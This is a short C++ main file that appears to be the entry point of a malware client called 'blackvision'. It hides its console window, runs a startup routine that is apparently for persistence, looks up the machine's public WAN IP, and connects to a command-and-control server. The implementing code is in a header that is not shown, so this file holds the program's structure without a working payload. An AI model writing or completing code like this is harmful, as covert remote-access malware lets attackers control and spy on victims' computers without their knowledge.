//#include "pch.h"
#include "blackvision.h"

int main()
{
	FreeConsole();
	Blackvision bv;
	bv.startup();
	bv.Wanip();
	bv.C2Connect();
	return 0;
}
